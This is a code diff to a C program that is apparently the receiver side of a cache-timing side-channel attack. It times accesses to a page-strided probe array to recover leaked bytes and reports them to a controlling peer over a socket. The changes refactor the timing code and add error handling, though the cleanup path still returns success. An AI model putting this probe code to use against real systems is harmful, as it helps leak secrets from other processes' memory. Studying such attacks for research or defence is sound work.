@@ -19,6 +19,7 @@ int x;
 int main(int argc, char *argv[])
 {
     printf("Attack pid = %d\n", getpid());
+
     int err;
     if (argc < 2)
     {
@@ -36,25 +37,19 @@ int main(int argc, char *argv[])
 
     uint64_t threshold = calculate_threshold(1000000);
 
-//    // Read the array in memory
-//    for (int i = 0; i < 256; i++)
-//        x &= array[i*4096 + OFFSET];
-//    for (int i = 0; i < 256; i++)
-//        _mm_clflush(&array[i*4096 + OFFSET]);
-
     int sock = setup_server(CONTROL_PORT);
     if (sock < 0)
     {
-        munmap(array, ARRSIZE);
-        return EXIT_FAILURE;
+        err = EXIT_FAILURE;
+        goto err_quit0;
     }
 
     int master = accept(sock, NULL, NULL);
     if (master < 0)
     {
         perror("accept");
-        munmap(array, ARRSIZE);
-        return EXIT_FAILURE;
+        err = EXIT_FAILURE;
+        goto err_quit1;
     }
     printf("Master connected, starting\n");
 
@@ -63,21 +58,24 @@ int main(int argc, char *argv[])
     {
         int requests[REQUEST_SIZE] = {};
         err = recv(master, requests, sizeof(requests), 0);
+        if (err < 0)
+        {
+            err = EXIT_FAILURE;
+            perror("recv");
+            goto err_quit2;
+        }
+        else if (err == 0)
+        {
+            err = EXIT_SUCCESS;
+            goto err_quit2;
+        }
         usleep(100);
 
         int found = 0;
         char sym  = '\0';
         for (int i = 1; i < 200; i++)
         {
-            unsigned junk = 0;
-
-            uint64_t start, finish;
-            start  = __rdtscp(&junk);
-            x = array[i*4096 + OFFSET];
-            finish = __rdtscp(&junk);
-
-            uint64_t duration = finish - start;
-            // if (duration < 200)
+            uint64_t duration = measure_access_time(&array[i*4096 + OFFSET]);
             if (duration < threshold)
             {
                 sym = (isprint(i) ? i : '?');
@@ -89,6 +87,12 @@ int main(int argc, char *argv[])
         err = send(master, &found, sizeof(found), 0);
     }
 
+
+err_quit2:
+    close(master);
+err_quit1:
+    close(sock);
+err_quit0:
     munmap(array, ARRSIZE);
     return EXIT_SUCCESS;
 }
